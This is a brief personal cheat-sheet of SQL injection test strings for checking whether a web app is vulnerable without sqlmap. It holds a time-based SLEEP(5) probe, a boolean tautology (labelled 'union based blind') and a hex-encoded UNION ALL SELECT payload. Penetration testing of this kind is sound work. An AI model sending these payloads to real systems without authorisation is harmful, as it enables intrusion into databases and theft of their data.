# sql injection cheat-sheet (of sorts)

i struggle with testing for sql injection points without sqlmap, so i've tried to collect a handful of injection commands that may indicate the webapp in question is vulnerable

###time-based boolean

`id=17 AND SLEEP(5)`

if the webapp sleeps, good indication that the webapp is vuln

###union based blind

`id=17 AND 6793=6793`

###generic union query

`id=-2450 UNION ALL SELECT NULL,CONCAT(0x71626a6b71,0x765865646350576b57536b58766c52534b526248514579716f59476f6
250424d7751426351726d55,0x717a6a6271),NULL,NULL,NULL,NULL,NULL,NULL-- AWCO`




